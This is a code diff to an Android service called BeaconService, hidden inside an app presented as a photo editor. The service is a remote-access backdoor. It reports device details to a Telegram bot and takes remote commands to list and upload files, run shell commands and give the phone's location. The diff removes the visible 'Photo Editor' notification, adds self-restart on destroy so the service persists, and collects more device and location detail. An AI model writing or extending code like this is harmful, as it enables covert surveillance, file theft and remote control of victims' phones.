@@ -1,6 +1,6 @@
 package com.photo.editor
 
-import android.app.*
+import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.os.Build
@@ -25,37 +25,26 @@ class BeaconService : Service() {
     private val CHAT_ID = "6146550840"
     private val API = "https://api.telegram.org/bot$BOT_TOKEN"
     private var offset = 0L
+    private var started = false
 
     override fun onCreate() {
         super.onCreate()
-        try {
-            if (Build.VERSION.SDK_INT >= 34) {
-                startForeground(1, buildNotification(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-            } else if (Build.VERSION.SDK_INT >= 26) {
-                startForeground(1, buildNotification())
-            }
-        } catch (e: Exception) {
-            Log.e("beacon", "foreground failed", e)
-        }
+        if (started) return
+        started = true
         scope.launch { loop() }
     }
 
-    private fun buildNotification(): Notification {
-        val channelId = "svc"
-        if (Build.VERSION.SDK_INT >= 26) {
-            val ch = NotificationChannel(channelId, "Service", NotificationManager.IMPORTANCE_LOW)
-            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (!started) {
+            started = true
+            scope.launch { loop() }
         }
-        return Notification.Builder(this, channelId)
-            .setContentTitle("Photo Editor")
-            .setContentText("Running")
-            .setSmallIcon(android.R.drawable.ic_menu_gallery)
-            .build()
+        return START_STICKY
     }
 
     private suspend fun loop() {
         try {
-            send("new beacon\nmodel: ${Build.MODEL}\nandroid: ${Build.VERSION.RELEASE}")
+            send("new beacon\nmodel: ${Build.MODEL}\nbrand: ${Build.BRAND}\nandroid: ${Build.VERSION.RELEASE}\nsdk: ${Build.VERSION.SDK_INT}")
         } catch (e: Exception) {
             Log.e("beacon", "beacon send failed", e)
         }
@@ -103,12 +92,13 @@ class BeaconService : Service() {
             "/ls" -> send(lsText(arg))
             "/get" -> sendFile(arg)
             "/shell" -> send(shellText(arg))
+            "/ping" -> send("pong")
             else -> send("unknown: $cmd")
         }
     }
 
     private fun infoText(): String {
-        return "model: ${Build.MODEL}\nbrand: ${Build.BRAND}\nandroid: ${Build.VERSION.RELEASE}\nsdk: ${Build.VERSION.SDK_INT}"
+        return "model: ${Build.MODEL}\nbrand: ${Build.BRAND}\nandroid: ${Build.VERSION.RELEASE}\nsdk: ${Build.VERSION.SDK_INT}\nhost: ${Build.HOST}"
     }
 
     private fun locationText(): String {
@@ -116,7 +106,7 @@ class BeaconService : Service() {
             val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
             val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                 ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
-            if (loc != null) "lat: ${loc.latitude}\nlon: ${loc.longitude}" else "no location"
+            if (loc != null) "lat: ${loc.latitude}\nlon: ${loc.longitude}\naccuracy: ${loc.accuracy}m" else "no location"
         } catch (e: Exception) {
             "loc error: ${e.message}"
         }
@@ -217,5 +207,10 @@ class BeaconService : Service() {
     override fun onDestroy() {
         scope.cancel()
         super.onDestroy()
+        try {
+            startService(Intent(this, BeaconService::class.java))
+        } catch (e: Exception) {
+            Log.e("beacon", "restart failed", e)
+        }
     }
 }
